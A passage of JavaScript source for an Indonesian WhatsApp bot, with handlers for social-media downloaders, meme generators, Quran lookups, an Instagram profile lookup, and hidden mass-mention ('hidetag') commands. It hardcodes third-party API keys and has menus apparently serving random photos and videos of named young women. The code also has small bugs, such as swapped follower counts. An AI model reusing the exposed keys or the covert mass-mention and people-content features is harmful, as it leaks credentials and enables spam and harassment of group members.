										"buttonId": `${prefix}play ${q}`,
										"buttonText": {
											"displayText": `🌐 ʏᴏᴜᴛᴜʙᴇ`
											},
										"type": "RESPONSE"
										}]
										sendButLocation(from, liriknya, `\n© ${fake1}`, foto, oket, {contextInfo: forward})
										
            } catch (err){
            	setReply("Wuanjir error, coba lirik lain")
   
            }
            break
                    case 'twtdl':
                    if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://twitter.com/gofoodindonesia/status/1229369819511709697`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/twitter?apikey=${apikey}&url=${ini_url}`)
                    ini_url = ini_url.result
                    ini_url = ini_url[ini_url.length - 1].link
                    ini_buffer = await getBuffer(ini_url)
                    await ikyc.sendMessage(from, ini_buffer, video, { quoted: iky })
                    break
                case 'fbdl':
                if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/facebook?apikey=${apikey}&url=${ini_url}`)
                    ini_url = ini_url.result[0].link
                    ini_buffer = await getBuffer(ini_url)
                    await ikyc.sendMessage(from, ini_buffer, video, { quoted: iky })
                    break
  case 'igdl':
		if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`http://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${ini_url}`)
                    ini_url = ini_url.result
                    ini_type = image
                    if (ini_url.includes(".mp4")) ini_type = video
                    ini_buffer = await getBuffer(ini_url)
                    ikyc.sendMessage(from, ini_buffer, ini_type, { quoted: iky})
                    break 
case 'pinterest':
try{
        if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if(!q) return setReply('gambar apa?')
            setReply(mess.wait)
            let pin = await hx.pinterest(q)
            let ac = pin[Math.floor(Math.random() * pin.length)]
            
            let di = await getBuffer(ac)
            await ikyc.sendMessage(from,di,image,{quoted: iky})
               } catch (err){
					      console.log(err)
					       return setReply("Yah ga ketemu, coba lagi dong ^_^ ")
					       }
            break
	case 'igstory': 
            if(!q) return setReply('Usernamenya?')
            pape = q
            hx.igstory(pape)
           .then(async result => {
            for(let i of result.medias){
            if(i.url.includes('mp4')){
            let link = await getBuffer(i.url)
            ikyc.sendMessage(from,link,video,{quoted: iky,caption: `${i.type}`})
            } else {
            let link = await getBuffer(i.url)
            ikyc.sendMessage(from, link, image,{quoted: iky,caption: `${i.type}`})                  
            }
            }
            });
            break	
	case 'linkwa':
            if(!q) return setReply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '*「 _LINK WA_ 」*\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            setReply(res)
            });
            break	
	case 'otaku':
	try{
		setReply("Wait kak, kalo ga respon berarti error")
            if(!q) return setReply('judul animenya?')
            let anime = await hx.otakudesu(q)
            rem = `*Judul* : ${anime.judul}
*Jepang* : ${anime.jepang}
*Rating* : ${anime.rate}
*Produser* : ${anime.produser}
*Status* : ${anime.status}
*Episode* : ${anime.episode}
*Durasi* : ${anime.durasi}
*Rilis* : ${anime.rilis}
*Studio* : ${anime.studio}
*Genre* : ${anime.genre}\n
*Sinopsis* :
${anime.desc}\n\n*Link Batch* : ${anime.batch}\n*Link Download SD* : ${anime.batchSD}\n*Link Download HD* : ${anime.batchHD}`
            ram = await getBuffer(anime.img)
           await ikyc.sendMessage(from,ram,image,{quoted:iky,caption:rem})
            } catch (err){
            	console.log(err)
            	return setReply("Ga ketemu om")
            }       
            break
         
case 'komikindo':
            axios.get('https://komikindo.co/?s=' + q)
	.then(({ data }) => {
            console.log(`${data}`)
            setReply(`${data}`)
            })
            break
	
	
	
	
	
	
	
	
	case 'chara':
	case 'wallpaperflare':
	try{
            if(!q) return setReply(`gambar apa?\n${prefix}chara nino`)
            let im = await hx.chara(q)
            let acak = im[Math.floor(Math.random() * im.length)]
            let li = await getBuffer(acak)
            await ikyc.sendMessage(from,li,image,{quoted: iky})
                  } catch (err){
					      console.log(err)
					        setReply("Yah ga ketemu, coba lagi dong ^_^ ")
					       }
            break
	
	
	
	case 'playstore':
            if(!q) return setReply('lu nyari apa?')
            let play = await hx.playstore(q)
            let store = '❉─────────────────────❉\n'
            for (let i of play){
            store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
            }
            setReply(store)
            break
            
            
            
            
            
            
            
            
            
            
            
            
            case 'ttwm':        
                     if (args.length < 1) return setReply('Link?')
                     if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return setReply("Error link")
                     lin = args[0]
                     setReply(mess.wait)
                     hx.ttdownloader(lin).then(res => {
                     console.log('[ T I K T O K ] downloader')
                     ep = res.wm                     
                     sendFileFromUrl(ep, video, {quoted: iky, caption: "Nih"})
                      })
                      break  
case 'togif':
               if ((isMedia && !iky.message.videoMessage || isQuotedSticker) && args.length == 0) {
               setReply(mess.wait)
               encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(iky).replace('quotedM','m')).message.extendedTextMessage.contextInfo : iky
               media = await ikyc.downloadAndSaveMediaMessage(encmedia)
               a = await webp2gifFile(media)
               mp4 = await getBuffer(a.result)
               ikyc.sendMessage(from, mp4, video, {mimetype: 'video/gif', quoted: iky, caption: "Nih"})
               fs.unlinkSync(media)
               } else {
               setReply("Format salah")
}
               break
       	
    case 'igstalk':
		try{
		            if (!q) return fakegroup('Usernamenya?')
		            ig.fetchUser(`${args.join(' ')}`).then(Y => {
		            console.log(`${args.join(' ')}`)
		            ten = `${Y.profile_pic_url_hd}`
		            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.following}\n*Following* : ${Y.followers}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
		            sendMediaURL(from,ten,teks) 
		            })} catch (err){
			console.log(err)
			setReply("Aduh error om")
			}
        break;     
            
case 'wanted':
case 'utatoo':
case 'unsharpen':
case 'thanos':
case 'sniper':
case 'sharpen':
case 'sepia':
case 'scary':
case 'rip':
case 'redple':
case 'rejected':
case 'posterize':
case 'ps4':
case 'pixelize':
case 'missionpassed':
case 'moustache':
case 'lookwhatkarenhave':
case 'jail':
case 'invert':
case 'instagram':
case 'greyscale':
case 'glitch':
case 'gay':
case 'frame':
case 'fire':
case 'distort':
case 'dictator':
case 'deepfry':
case 'ddungeon':
case 'circle':
case 'challenger':
case 'burn':
case 'brazzers':
case 'beautiful':
//if (iky.message.extendedTextMessage === null || iky.message.extendedTextMessage === undefined) return  setReply("Tag atau Reply targetnya")
     var imgbb = require('imgbb-uploader')
     if (isQuotedImage) {
     setReply(mess.wait)
     let ppk = await ikyc.getProfilePicture(sender).catch(_ => 'https://telegra.ph/file/6ea2baa958c1d4c68fb73.png')
	 thumbnya = await getBuffer(ppk)
   var bioij = JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
    var delib = await ikyc.downloadAndSaveMediaMessage(bioij, `./stik/${sender}.png`)
    let  datau = await imgbb(imgbbkey, delib)
     anuk = `${datau.display_url}`
     ini_gen = `${command}`
     console.log(color(ini_gen))
     imoj = await ameApi.generate(ini_gen, { url: anuk})
     ikyc.sendFile(from, imoj, `${sender}.png`, null, iky, {thumbnail: thumbnya})
     fs.unlinkSync(delib)
     } else if (isQuotedTag) {
     	setReply(mess.wait)
		ghost = iky.message.extendedTextMessage.contextInfo.participant || iky.message.extendedTextMessage.contextInfo.mentionedJid[0]
		let oppp = await ikyc.getProfilePicture(ghost).catch(_ => 'https://telegra.ph/file/24fa902ead26340f3df2c.png')
		let medianya = await getBuffer(oppp)
		let datae = await imageToBase64(JSON.stringify(oppp).replace(/\"/gi, ''))
		fs.writeFileSync('janckuk.jpeg', datae, 'base64')
		let odata = await imgbb(imgbbkey, 'janckuk.jpeg')
		anuk = `${odata.display_url}`
     ini_gen = `${command}`
     console.log(color(ini_gen))
     imoj = await ameApi.generate(ini_gen, { url: anuk})
     ikyc.sendFile(from, imoj, sticker, `${sender}.png`, null, iky, {thumbnail: medianya}) 
     } else {
     setReply("Tag atau Reply targetnya")
     }
     break
            
    case 'totag':
    if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if (!iky.key.fromMe && !isOwner && !isGroupAdmins) return setReply(mess.admin)
            if ((isMedia && !iky.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
            file = await ikyc.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await ikyc.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: iky
            }
            ini_buffer = fs.readFileSync(file)
            ikyc.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !iky.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
            file = await ikyc.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await ikyc.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: iky
            }
            ini_buffer = fs.readFileSync(file)
            ikyc.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !iky.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
            file = await ikyc.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await ikyc.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'audio/mp4',
            	ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: iky
            }
            ini_buffer = fs.readFileSync(file)
            ikyc.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !iky.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
            file = await ikyc.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await ikyc.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
            	mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: iky
            }
            ini_buffer = fs.readFileSync(file)
            ikyc.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          setReply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
case 'h':
             if (!isGroupAdmins) return reply(mess.only.admin)
             try {
             quotedText = iky.message.extendedTextMessage.contextInfo.quotedMessage.conversation
             hideTag(from, `${quotedText}`)
             } catch {
             hideTag(from, `${q}`)
}
             break
case 'tag1':
			  if (!iky.key.fromMe) return reply(mess.me)
for (let a of groupMembers) {
hideTag(from,`@${a.jid.split('@')[0]}`,'conversation',{contextInfo:{ "mentionedJid": mem } })
}
break
	case 'hidetag':
	case 'ht':
	if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
  if(isZadani) return
			if (!isGroup) return setReply(mess.only.group)
			var value = args.join(' ')
			var group = await ikyc.groupMetadata(from)
			var member = group['participants']
			var mem = []
			member.map(async adm => {
			mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
			})
			var optionshidetag = {
			text: value,
			contextInfo: { mentionedJid: mem },
			quoted: iky
			}
			ikyc.sendMessage(from, optionshidetag, text)
			break
	
	case 'asupan':
	if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
           const rows5 = [{
        "title": 'rikagusriani',
        "rowId": '0'
    }, {
        "title": 'ukhty',
        "rowId": '0'
    }, {
        "title": 'santuy',
        "rowId": '0'     
    }, {
        "title": 'geayubi',
        "rowId": '0'
    }, {
        "title": 'bocil',
        "rowId": '0'
    }, {
        "title": 'asupan',
        "rowId": '0'
    }, {
        "title": 'chika',
        "rowId": '0'
    }, {
        "title": 'delvira',
        "rowId": '0'
    }, {   
        "title": 'kienzi',
        "rowId": '0'
    }, {
        "title": 'ayu',
        "rowId": '0'
    }, {
        "title": 'bunga',
        "rowId": '0'
    }, {
        "title": 'aura',
        "rowId": '0'
    }, {
        "title": 'nisa',
        "rowId": '0'
    }, {
        "title": 'ziva',
        "rowId": '0'
    }, {
        "title": 'yana',
        "rowId": '0'
    }, {
        "title": 'viona',
        "rowId": '0'
    }, {
        "title": 'syania',
        "rowId": '0'
    }, {
        "title": 'riri',
        "rowId": '0'
    }, {
        "title": 'syifa',
        "rowId": '0'
    }, {
        "title": 'mama_gina',
        "rowId": '0'
    }, {
        "title": 'alcakenya',
        "rowId": '0'
    }, {
        "title": 'mangayutri',
        "rowId": '0'
    }];
    const sections5 = [{
        title: 'Pilih salah satu',
        rows: rows5
    }];
    const listt5 = {
        buttonText: 'SELECT HERE',
        title: `ASUPAN MENU`,
        description: `Hai kak ${pushname} Semoga harimu menyenangkan 🌝`,
        footerText: `Here Is Iky Botz`,
        sections: sections5,
        listType: 1
    };
    ikyc.sendMessage(from, listt5, MessageType.listMessage, {
        contextInfo: {
            "mentionedJid": [sender]
        }
    })
break
case 'cecan':
	if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
           const rows6 = [{
        "title": 'Cecan Indo',
        "rowId": `${prefix}ceweindo`
    }, {
        "title": 'Cecan Jepang',
        "rowId": `${prefix}cewejepang`
    }, {
        "title": 'Cecan Korea',
        "rowId": `${prefix}cewekorea`
    }, {
        "title": 'Cecan Arab',
        "rowId": `${prefix}cewearab`
    }, {
        "title": 'Cecan Malaysia',
        "rowId": `${prefix}cewemalaysia`
    }, {
        "title": 'Cecan Russia',
        "rowId": `${prefix}cewerussia`
    }, {
        "title": 'Cecan Amerika',
        "rowId": `${prefix}ceweamerika`
    }];
    const sections6 = [{
        title: 'Pilih salah satu',
        rows: rows6
    }];
    const listt6 = {
        buttonText: 'JAN NAPSU',
        title: `CECAN MENU`,
        description: `Hai kak ${pushname} Semoga harimu menyenangkan 🌝 \nCogan? Next Ae`,
        footerText: `Random Cecan By Iky`,
        sections: sections6,
        listType: 1
    };
    ikyc.sendMessage(from, listt6, MessageType.listMessage, {
        contextInfo: {
            "mentionedJid": [sender]
        }
    })
break  
		case 'ytdl':
    case 'youtubedl': 
        if (!isPremium && !isOwner && !iky.key.fromMe) return setReply(`Kamu bukan user premium`)
             if (args.length < 1) return setReply('Link Nya Mana?')
             if(!isUrl(args[0]) && !args[0].includes('youtu')) return setReply('aduh error')
             teks = args.join(' ')
             res = await y2mateA(teks).catch(e => {
             setReply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_')
})
             result = `*Youtube Downloader*
             
📜 Title : ${res[0].judul}
🎁 Type : mp3/mp4
⚖️ File : ${res[0].size}`
             
              fs.writeFileSync(`./ytmp.jpeg`, await getBuffer(res[0].thumb))
              
              imageMsg = ( await ikyc.prepareMessage(from, fs.readFileSync(`./ytmp.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
             
              gbutsan = [
  {buttonId: `${prefix}buttons2 ${q}`,buttonText:{displayText: `▶️ Video`},type:1},
  {buttonId:`${prefix}buttons1 ${q}`, buttonText: {displayText:`🎵Audio`},type:1}
]
             
              gbuttonan = {
imageMessage: imageMsg,
    contentText:`${result}`,
    footerText:'Pilih satu format di bawah ini',
    buttons: gbutsan,
    headerType: 4
    }
  await ikyc.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {
            quoted: setQuoted, contextInfo: forward})
              fs.unlinkSync(`./ytmp.jpeg`)
              break
	
	
	
	
	
	
	
	
	
	
                       


           
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
  //-------------------------------》FITUR GROUP《-------------------------------\\           

case "q":
        if (!isOwner && !iky.key.fromMe)return reply(mess.own)
        if (!m.quoted) return reply("reply message!");
        let qse = ikyc.serializeM(await m.getQuotedObj());
        if (!qse.quoted)
          return reply("the message you replied does not contain a reply!");
        await qse.quoted.copyNForward(m.chat, true);
        break;
case 'qrmaker':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Iky Ganss`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/qrcode?apikey=${apikey}&text=${ini_txt}`)
                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
                    break
case 'tahta':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Iky Ganss`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/hartatahta?apikey=${apikey}&text=${ini_txt}`)
                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
                    break
                    case 'meme1':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Iky Ganss`)
                    ini_txt = args.join(" ")
                    ini_buffer = await getBuffer(` https://api.lolhuman.xyz/api/meme1?apikey=${apikey}&text=${ini_txt}`)
                    await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
                    break 
                    case 'meme2':                                   
if (!c) return reply('Textnya mana gan?')
                    txt1 = arg.split("|")[0]
                    txt2 = arg.split("|")[1]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/meme7?apikey=${apikey}&text1=${txt1}&text2=${txt2}`)
await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
break
case 'meme3':                                   
if (!c) return reply('Textnya mana gan?')
                    txt1 = arg.split("|")[0]
                    txt2 = arg.split("|")[1]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/meme8?apikey=${apikey}&text1=${txt1}&text2=${txt2}`)
await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
break
case 'meme4':                                   
if (!c) return reply('Textnya mana gan?')
                    txt1 = arg.split(" ")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/creator/kannagen?apikey=${apikey}&text1=${txt1}`)
await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
break   
case 'meme5':                                   
if (!c) return reply('Textnya mana gan?')
                    txt1 = arg.split("|")
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/creator/ohno?apikey=${apikey}&text1=${txt1}`)
await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
break   
case 'meme6':                                   
if (!c) return reply('Textnya mana gan?')
                    txt1 = arg.split("|")[0]
                    txt2 = arg.split("|")[1]
                    txt3 = arg.split("|")[2]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/meme3?apikey=${apikey}&text1=${txt1}&text2=${txt2}&text3=${txt3}`)
await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
break   
case 'meme7':
if (!c) return reply('Textnya mana gan?')
                    txt1 = arg.split("|")[0]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/meme4?apikey=${apikey}&text1=${txt1}`)
await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
break   
case 'meme8':                                   
if (!c) return reply('Textnya mana gan?')
                    txt1 = arg.split("|")[0]
                    txt2 = arg.split("|")[1]
                    txt3 = arg.split("|")[2]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/meme6?apikey=${apikey}&text1=${txt1}&text2=${txt2}&text3=${txt3}`)
await ikyc.sendMessage(from, ini_buffer, image, { quoted: iky })
break 

                 // Islami //
case 'listsurah':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = 'List Surah:\n'
                    for (var x in get_result) {
                        ini_txt += `${x}. ${get_result[x]}\n`
                    }
                    reply(ini_txt)
                    break
                case 'alquran':
                    if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
                    urls = `https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=${apikey}`
                    quran = await fetchJson(urls)
                    result = quran.result
                    ayat = result.ayat
                    ini_txt = `QS. ${result.surah} : 1-${ayat.length}\n\n`
                    for (var x of ayat) {
                        arab = x.arab
                        nomor = x.ayat
                        latin = x.latin
                        indo = x.indonesia
                        ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
                    }
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    ini_txt = ini_txt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
                    ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
                    reply(ini_txt)
                    break
                case 'alquranaudio':
                    if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
                    surah = args[0]
                    ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=${apikey}`)
                    await ikyc.sendMessage(from, ini_buffer, audio, { quoted: iky, mimetype: Mimetype.mp4Audio })
                    break
                case 'asmaulhusna':
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `No : ${get_result.index}\n`
                    ini_txt += `Latin: ${get_result.latin}\n`
                    ini_txt += `Arab : ${get_result.ar}\n`
                    ini_txt += `Indonesia : ${get_result.id}\n`
                    ini_txt += `English : ${get_result.en}`
                    reply(ini_txt)
                    break        
                               
case 'listitem':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Magplant`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/growstocks?apikey=himaru&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Name : *${get_result.name}*\n\n`
                    ini_txt += `Deskripsi : ${get_result.desc}\n`
                    ini_txt += `Ke Stabilan : ${get_result.price_status}\n`
                    ini_txt += `Demand : ${get_result.demand_status}\n`
                    ini_txt += `Source : ${get_result.source}\n`
                    ini_txt += `Edited : ${get_result.edited}`
                    reply(ini_txt)
                    break
                case 'kisahnabi':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Name : ${get_result.name}\n`
                    ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
                    ini_txt += `Umur : ${get_result.age}\n`
                    ini_txt += `Tempat : ${get_result.place}\n`
                    ini_txt += `Story : \n${get_result.story}`
                    reply(ini_txt)
                    break
                case 'jadwalsholat':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
                    daerah = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${daerah}?apikey=${apikey}`)
                    get_result = get_result.result
                    ini_txt = `Wilayah : ${get_result.wilayah}\n`
                    ini_txt += `Tanggal : ${get_result.tanggal}\n`
                    ini_txt += `Sahur : ${get_result.sahur}\n`
                    ini_txt += `Imsak : ${get_result.imsak}\n`
                    ini_txt += `Subuh : ${get_result.subuh}\n`
                    ini_txt += `Terbit : ${get_result.terbit}\n`
                    ini_txt += `Dhuha : ${get_result.dhuha}\n`
                    ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
                    ini_txt += `Ashar : ${get_result.ashar}\n`
                    ini_txt += `Maghrib : ${get_result.imsak}\n`
                    ini_txt += `Isya : ${get_result.isya}`
                    reply(ini_txt)
                    break

                    // Downloader //                                 
                case 'ytsearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Views : ${x.views}\n`
                        ini_txt += `Published : ${x.published}\n`
                        ini_txt += `Thumbnail : ${x.thumbnail}\n`
                        ini_txt += `Link : https://www.youtube.com/watch?v=${x.videoId}\n\n`
                    }
                    reply(ini_txt)
                    break               
                case 'telesticker':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
                    ini_url = args[0]
                    ini_url = await fetchJson(`https://api.lolhuman.xyz/api/telestick?apikey=${apikey}&url=${ini_url}`)
                    ini_sticker = ini_url.result.sticker
                    for (sticker_ in ini_sticker) {
                        ini_buffer = await getBuffer(ini_sticker[sticker_])
                        await ikyc.sendMessage(from, ini_buffer, sticker)
                    }
                    break
case 'tiktok':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
                    ini_url = args[0]
                    ini_url = `https://api.lolhuman.xyz/api/tiktok?apikey=himaru&url=${ini_url}`
                    get_result = await fetchJson(ini_url)
                    ini_buffer = await getBuffer(get_result.result.link)
                    await ikyc.sendMessage(from, ini_buffer, video, { quoted: iky })
                    break
                case 'ttmusic':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
                    ini_link = args[0]
                    get_audio = await getBuffer(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=himaru&url=${ini_link}`)
                    await ikyc.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: iky })
                    break
                case 'ytaudio':
                    if (args.length == 0) return reply(`Example: ${prefix + command} link`)
                    ini_link = args[0]
                    get_audio = await getBuffer(`https://api.lolhuman.xyz/api/ytaudio?apikey=${apikey}&url=${ini_link}`)
                    await ikyc.sendMessage(from, get_audio, audio, { mimetype: Mimetype.mp4Audio, quoted: iky })
                    break
                case 'spotify':
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
                    woy = args[0]
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/spotify?apikey=${apikey}&url=${woy}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Artists : ${get_result.artists}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Popularity : ${get_result.popularity}\n`
                    ini_txt += `Preview : ${get_result.preview_url}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    await ikyc.sendMessage(from, thumbnail, image, { quoted: iky, caption: ini_txt })
                    get_audio = await getBuffer(get_result.link)
                    await ikyc.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, quoted: iky })
                    break
                case 'spotifysearch':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/spotifysearch?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = ""
                    for (var x of get_result) {
                        ini_txt += `Title : ${x.title}\n`
                        ini_txt += `Artists : ${x.artists}\n`
                        ini_txt += `Duration : ${x.duration}\n`
                        ini_txt += `Link : ${x.link}\n`
                        ini_txt += `Preview : ${x.preview_url}\n\n\n`
                    }
                    reply(ini_txt)
                    break
                case 'jooxplay':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jooxplay?apikey=${apikey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.info.song}\n`
                    ini_txt += `Artists : ${get_result.info.singer}\n`
                    ini_txt += `Duration : ${get_result.info.duration}\n`
                    ini_txt += `Album : ${get_result.info.album}\n`
                    ini_txt += `Uploaded : ${get_result.info.date}\n`
                    ini_txt += `Lirik :\n ${get_result.lirik}\n`
                    thumbnail = await getBuffer(get_result.image)
                    await ikyc.sendMessage(from, thumbnail, image, { quoted: iky, caption: ini_txt })
                    get_audio = await getBuffer(get_result.audio[0].link)
                    await ikyc.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.info.song}.mp3`, quoted: iky })
                    break
case 'play':
                     if (!isPremium) return ('Lu Prem')
if (args.length ==0)return reply('Judul Lagunya Apa?')
woy = args.join(" ")
reply(mess.wait)
ini = await fetchJson(`https://api-alphabot.herokuapp.com/api/downloader/youtube/playmp3?query=${q}&apikey=Alphabot`)
thmb = await getBuffer(ini.results.thumb)
ply1 =`Judul: ${ini.results.title}\nSize: ${ini.results.size}\nChannel: ${ini.results.channel}`
ply2 =`Silahkan Pilih Media Di Bawah ini`
but = [
{ buttonId: `${prefix}mp3 ${q}`, buttonText: { displayText: '️ᴍᴜsɪᴋ 🎵' }, type: 1 },
{ buttonId: `${prefix}mp4 ${q}`, buttonText: { displayText: 'ᴠɪᴅᴇᴏ 📽️' }, type: 1 }
]
